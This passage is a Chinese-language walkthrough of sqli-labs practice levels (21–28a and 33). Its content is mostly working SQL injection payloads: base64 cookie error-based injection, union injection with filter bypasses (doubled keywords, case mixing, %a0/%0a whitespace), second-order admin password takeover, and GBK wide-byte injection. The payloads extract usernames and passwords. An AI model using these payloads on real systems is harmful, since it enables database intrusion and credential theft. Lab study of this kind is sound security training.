- 爆字段`payload:MScgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgnficsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2VycycpLCd+JykpIw==` 右：`MScgb3IgZXh0cmFjdHZhbHVlKDEscmlnaHQoY29uY2F0KCd+Jywoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSlmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyksJ34nKSwzMikpIw==`
- 爆数据`payload:MScgYW5kIGV4dHJhY3R2YWx1ZSgxLCBjb25jYXQoMHg3ZSwoc2VsZWN0IChncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzKSwweDdlKSklMjM=` `payload:?MScgYW5kIGV4dHJhY3R2YWx1ZSgxLCByaWdodChjb25jYXQoMHg3ZSwoc2VsZWN0IChncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzKSwweDdlKSwzMikpIw==`

## less-22

##### 注入类型

cookie部分注入(base64)加密

##### 输入点

采用damin登录后，发现cookie会获取username的值再传入。刷新页面，会重新获取cookie于是可以趁机修改，但是这个cookie是经过加密过后的。

![image-20201113154324761](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114715.png)

##### 输出点：

在BP包中将cookie：username=admin改为username=AAA。发现页面也的`YOUR COOKIE : uname =`也会修改。于是就可以在这里进行报错注入。传入`AAA'`，爆错如下，所以是对username做了""处理。所以使用`"`来闭合它![image-20201113155254893](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114718.png)

![image-20201113155333933](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114719.png)

##### 注入方式

通过它会cookie的值这个特性来修改cookie来使用报错语句进行sql注入（需要对报错语句进行base64加密）

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:?YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj`
- 爆数据表`payload:MSIgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgnficsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwnficpKSM=`
- 爆字段`payload:MSIgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgnficsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2VycycpLCd+JykpIw==` 右：`MSIgIGFuZCBleHRyYWN0dmFsdWUoMSxyaWdodChjb25jYXQoJ34nLChzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnKSwnficpLDMyKSkj`
- 爆数据`payload:MSIgYW5kIGV4dHJhY3R2YWx1ZSgxLCBjb25jYXQoMHg3ZSwoc2VsZWN0IChncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzKSwweDdlKSklMjM=` `payload:?1MSIgYW5kIGV4dHJhY3R2YWx1ZSgxLCByaWdodChjb25jYXQoMHg3ZSwoc2VsZWN0IChncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzKSwweDdlKSwzMikpIw==`

## less-23

##### 注入类型

字符型union联合注入(过滤了#，--等注释符)

##### 输入点：

输入payload：`?id=3'`回显，所以说明对id做了`'id'`处理

![image-20201113201332998](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114720.png)

##### 输出点：

由于它过滤了注释符，所以我们无法将后面的东西注释掉后面的单引号。我们可以通过再加一个单引号来闭合后面的单引号payload:`?id=-1' or 1='1`语句相当于：`SELECT * FROM users WHERE id='1' or 1=’1’`

![image-20201113201626314](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114721.png)



##### 注入方式

使用2个单引号来闭合语句中原有的单引号。再使用union来联合注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列(通过select来判断)
- 联合查询，判断各列输出的位置`payload:?id=-1' union select 1,2,3 '1`
- 获取数据库`payload:?id=-1' union select 1,database(),'3`
- 爆数据表`payload:?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3`
- 爆users表的数据字段`payload：?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),'3`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1' union select 1,(select group_concat(username,'~',password) from users),'3`username和password中间使用~来分隔

## less-24

##### 注入类型

通过admin'#漏洞来修改admin的密码，使自己可以登录

##### 输入点：

因为它是一个注册，登录，修改密码的界面，所以自然而然的想到了admin'#漏洞

![image-20201113204732404](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114722.png)

##### 输出点：

登录数据库，可以发现admin'#这个用户已经成功添加进去，接着就可以利用admin'#漏洞来进行修改admin的密码

![image-20201113204858378](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114723.png)

##### 注入方式

使用admin'#漏洞来修改admin管理员的密码

##### 注入步骤

原理：

- 注册了一个admin'#的账号，修改该账号密码使传入的SQL语句就变为修改admin的密码，因为'#在语句中相当于#注释后面原有的单引号，'闭合前面的语句，就变为修改admin的密码了，这样就可以登录管理员账号来获取数据了`
- UPDATE users SET PASSWORD='new_pass' where username='admin'#' 就相当于执行 `UPDATE users SET PASSWORD='new_pass' where username='admin'`语句。就成功修改了admin的密码

## less-25

##### 注入类型

过滤了`or` 和`and`

##### 绕过方法：

- 大小写变形 Or，OR oR	
- 双写绕过（将or或and(过滤字符)替换为空的时候就可以使用双写绕过）
- 编码绕过 hex，urlencode
- 添加注释符/*or\*/
- 利用符号 and=&&   or=||

##### 输入点

输入`id=1'`回显如下，所以可知对id做了'id'的处理。

![image-20201115130321790](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114724.png)

##### 输出点：

输入payload`id=1' or 1=1--+`，回显如下过滤了，and。同样也过滤了or。所以我们需要绕过and和or。(这里直接将and和or替换为空)![image-20201115130602826](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114725.png)

payload：`?id=-1' oorr 1=1--+`采用双写来绕过or

![image-20201115130939368](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114726.png)

##### 注入方式

采用双写来绕过过滤，然后再使用 union联合查询来注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列(通过select来判断)
- 联合查询，判断各列输出的位置`payload:?id=-1' union select 1,2,3 --+`
- 获取数据库`payload:?id=-1' union select 1,database(),3 --+`
- 爆数据表`payload:?id=-1' union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),3 --+`
- 爆users表的数据字段`payload：?id=-1' union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),3 --+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1' union select 1,group_concat(username,'~',passwoorrd),3 from users--+`username和password中间使用~来分隔

## less-25a

##### 注入类型

过滤了`or` 和`and`。与less-25不同的就是25a没有输出报错项，不能使用报错注入，并且是数值型注入

##### 绕过方法：

- 大小写变形 Or，OR oR
- 双写绕过（将or或and(过滤字符)替换为空的时候就可以使用双写绕过）
- 编码绕过 hex，urlencode
- 添加注释符/*or\*/
- 利用符号 and=&&   or=||

##### 输入点

输入`id=-1'oorr 1=1 --+ `回显如下  `采用双写绕过过滤，见less-25`

![image-20201115132950169](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114727.png)

输入`id=-1oorr 1=1 --+ `回显如下。所以可以看出是数值型输入

![image-20201115132932219](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114728.png)

##### 输出点：

输出点为2,3位置

![image-20201115133154567](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114729.png)

##### 注入方式

双写绕过，再使用union来注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列(通过select来判断)
- 联合查询，判断各列输出的位置`payload:?id=-1 union select 1,2,3 --+`
- 获取数据库`payload:?id=-1 union select 1,database(),3 --+`
- 爆数据表`payload:?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),3 --+`
- 爆users表的数据字段`payload：?id=-1 union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),3 --+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1 union select 1,(select group_concat(username,'~',passwoorrd) from users), 3 --+`username和password中间使用~来分隔

## less-26(使用5.2的php)

##### 注入类型

过滤了空格，or，and,/*,#(含url编码),--,/做了过滤

##### 绕过方法：

%09  TAB 键（水平） 

%0a  新建一行 

%0c  新的一页 

%0d  return 功能 

%0b  TAB 键（垂直） 

%a0  空格

/*%a0\*/ 空格(5.4版本的PHP可以识别这个作为强制空格)

##### 输入点：

payload:`?id=1'`,会显如下，可以看出对id做了'id'处理，但是由于注释符被过滤了。于是需要使用or 语句来注释闭合即 select * from XXX where 'id=1' or '1'

![image-20201115133544624](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114730.png)

空格也被过滤了，所以使用%a0来替代。payload：`?id=1'%a0oorr%a0'1`

![image-20201115143901437](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114731.png)

##### 输出点：

payload:`100%27union%0bselect%a01,2,3||%271`回显如下。所以1,2为输出点

![image-20201115144030465](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114732.png)

##### 注入方式

使用%a0替代空格，|| 或oorr来替换or。再使用union来联合注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列(通过select来判断)
- 联合查询，判断各列输出的位置`payload:?id=100'%a0union%a0select%a01,2,3||%271`
- 获取数据库`payload:?id=100'union%a0select%a01,database(),3||'1`
- 爆数据表`payload:?id=100'%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()),3%a0||'1`
- 爆users表的数据字段`payload：?id=100'%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name='users'),3%a0||'1`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id='union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%a0from%0busers%a0where%a0'1`username和password中间使用~来分隔

## less-26a

##### 注入类型

过滤了空格，or，and,/*,#(含url编码),--,/做了过滤 该题对id做的是('id')处理

##### 绕过方法：

%09  TAB 键（水平） 

%0a  新建一行 

%0c  新的一页 

%0d  return 功能 

%0b  TAB 键（垂直） 

%a0  空格

##### 输入点：

payload:`?id=1'%a0oorrder%a0by%a03%a0oorr '1'`,回显如下。

![image-20201115151616239](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114733.png)

payload：`?id=1')%a0oorrder%a0by%a03%a0oorr ('1`回显如下。所以对id做了('id')处理。但是由于注释符被过滤了。于是需要使用or 语句来注释闭合即 select * from XXX where ('id=1') or ('1')

![image-20201115151632936](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114734.png)

##### 输出点：

payload:`?id=100')union%0bselect%a01,2,3||('1`回显如下。所以1,2为输出点

![image-20201115151829917](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114735.png)

##### 注入方式

使用%a0替代空格，|| 或oorr来替换or。再使用union来联合注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列(通过select来判断)
- 联合查询，判断各列输出的位置`payload:?id=100')%a0union%a0select%a01,2,3||(%271`
- 获取数据库`payload:?id=100')union%a0select%a01,database(),3||('1`
- 爆数据表`payload:?id=100')%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()),3%a0||('1`
- 爆users表的数据字段`payload：?id=100')%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name='users'),3%a0||('1`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=')union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%a0from%0busers%a0where%a0('1`username和password中间使用~来分隔

## less-27

##### 注入类型

该题对单引号，union，select和less-26的过滤的字符做了过滤 对id做的是'id'处理

##### 输入点：

payload:`?id=1'`,回显如下。

![image-20201115152701753](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114736.png)

payload：`?id=0'/*%0a*/||/*%0a*/'1`回显如下。所以对id做了'id'处理。但是由于注释符被过滤了。于是需要使用or 语句来注释闭合即 select * from XXX where 'id=1' or '1'

![image-20201115153747868](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114737.png)

##### 输出点：

payload:`?id=0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,2,3/*%0a*/||/*%0a*/'1`回显如下。所以1,2为输出点(由于环境原因。5.2.17版本可以识别%a0，但是这题使用改版本)

![image-20201115153626846](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114738.png)

##### 注入方式

使用/*%a0\*/替代空格，|| 或oorr来替换or。再使用union来联合注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=0'/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,2,3||'1`
- 获取数据库`payload:?id=0'/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,database(),3or'`
- 爆数据表`payload:?id=0'/*%0a*/UNion/*%0a*/sEleCt/*%0a*/1,group_concat(table_name),3/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=database()or'1`
- 爆users表的数据字段`payload：?id=0'/*%0a*/uNIon/*%0a*/sELect/*%0a*/1,group_concat(column_name),3/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_name='users'or'1`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=0'/*%0a*/uniOn/*%0a*/sELect/*%0a*/1,group_concat(username,'~',password),3/*%0a*/from/*%0a*/users/*%0a*/where'1`username和password中间使用~来分隔

## less-27a

##### 注入类型

该题对单引号，union，select和less-26的过滤的字符做了过滤 对id做的是('id')处理

##### 输入点：

payload:`?id=1"`,回显如下。

![image-20201115191055017](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114739.png)

payload：`?id=1"/*%0a*/||/*%0a*/"1`回显如下。所以对id做了'id'处理。但是由于注释符被过滤了。于是需要使用or 语句来注释闭合即 select * from XXX where 'id=1' or '1'

![image-20201115153747868](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114737.png)

##### 输出点：

payload:`?id=0"/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,2,3/*%0a*/||/*%0a*/"1`回显如下。所以1,2为输出点(由于环境原因。5.2.17版本可以识别%a0，但是这题使用改版本)

![image-20201115191413576](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114740.png)

##### 注入方式

使用/*%a0\*/替代空格，|| 或oorr来替换or。再使用union来联合注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=0"/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,2,3||"1`
- 获取数据库`payload:?id=0"/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,database(),3or"`
- 爆数据表`payload:?id=0"/*%0a*/UNion/*%0a*/sEleCt/*%0a*/1,group_concat(table_name),3/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=database()or"1`
- 爆users表的数据字段`payload：?id=0"/*%0a*/uNIon/*%0a*/sELect/*%0a*/1,group_concat(column_name),3/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_name='users'or"1`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=0"/*%0a*/uniOn/*%0a*/sELect/*%0a*/1,group_concat(username,'~',password),3/*%0a*/from/*%0a*/users/*%0a*/where"1`username和password中间使用~来分隔

## less-28

##### 注入类型

过滤，绕过注入（同less-27一样）

##### 输入点：

payload:`?id=1'%a0oorrder%a0by%a03%a0oorr '1`,回显如下。

![image-20201115193319738](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114741.png)

payload：`?id=1')%a0oorrder%a0by%a03%a0oorr ('1`回显如下。所以对id做了('id')处理。但是由于注释符被过滤了。于是需要使用or 语句来注释闭合即 select * from XXX where ('id=1') or ('1')

![image-20201115151632936](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114734.png)

##### 输出点：

payload:`?id=100')union%0bselect%a01,2,3||('1`回显如下。所以1,2为输出点

![image-20201115151829917](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114735.png)

##### 注入方式

采用 /*%a0\*/来绕过空格

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=0')/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,2,3||('1`
- 获取数据库`payload:?id=0')/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,database(),3or('`
- 爆数据表`payload:?id=0')/*%0a*/UNion/*%0a*/sEleCt/*%0a*/1,group_concat(table_name),3/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=database()or('1`
- 爆users表的数据字段`payload：?id=0')/*%0a*/uNIon/*%0a*/sELect/*%0a*/1,group_concat(column_name),3/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_name='users'or('1`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=0')/*%0a*/uniOn/*%0a*/sELect/*%0a*/1,group_concat(username,'~',password),3/*%0a*/from/*%0a*/users/*%0a*/where('1`username和password中间使用~来分隔

## less-28a

##### 注入类型

过滤，绕过注入（同less-27一样）

##### 输入点：

payload:`?id=1'%a0oorrder%a0by%a03%a0oorr '1`,回显如下。

![image-20201115193319738](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114741.png)

payload：`?id=1')%a0oorrder%a0by%a03%a0oorr ('1`回显如下。所以对id做了('id')处理。但是由于注释符被过滤了。于是需要使用or 语句来注释闭合即 select * from XXX where ('id=1') or ('1')

![image-20201115151632936](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114734.png)

##### 输出点：

payload:`?id=100')union%0bselect%a01,2,3||('1`回显如下。所以1,2为输出点

![image-20201115151829917](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114735.png)

##### 注入方式

采用 /*%a0\*/来绕过空格

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=0')/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,2,3||('1`
- 获取数据库`payload:?id=0')/*%0a*/uNion/*%0a*/sEleCt/*%0a*/1,database(),3or('`
- 爆数据表`payload:?id=0')/*%0a*/UNion/*%0a*/sEleCt/*%0a*/1,group_concat(table_name),3/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=database()or('1`
- 爆users表的数据字段`payload：?id=0')/*%0a*/uNIon/*%0a*/sELect/*%0a*/1,group_concat(column_name),3/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_name='users'or('1`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=0')/*%0a*/uniOn/*%0a*/sELect/*%0a*/1,group_concat(username,'~',password),3/*%0a*/from/*%0a*/users/*%0a*/where('1`username和password中间使用~来分隔

## less-33

##### 注入类型

宽字节注入

##### 输入点：

输入`?id=ab'`回显如下，其使用`/`来过滤了`'`。通过/来转义

![image-20201110195700733](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114742.png)

##### 输出点

输入`?id=ab%df%27`。回显如下%df可以将后面的斜杠给消除掉(由于编码的漏洞，gbk编码会认为2个字符为一个汉字，这样%df和\就会构成一个汉字，这样\就会被绕过)![image-20201110195953756](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114743.png)

##### 注入方式

使用%df来过滤\，以此来成功通过`'`来闭合前面的语句，再通过union来注入

##### 注入步骤

- 判断列数`payload:?id=ab%df%27 order by 3 --+` 的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=-1%df%27 union select 1,2,3--+`
- 获取数据库`payload:?id=-1%df%27 union select 1,database(),3--+`
- 爆数据表`payload:?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`
- 爆users表的数据字段`payload：?id=-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1%df%27 union select 1,group_concat(username,'~',password),3 from users--+`username和password中间使用~来分隔
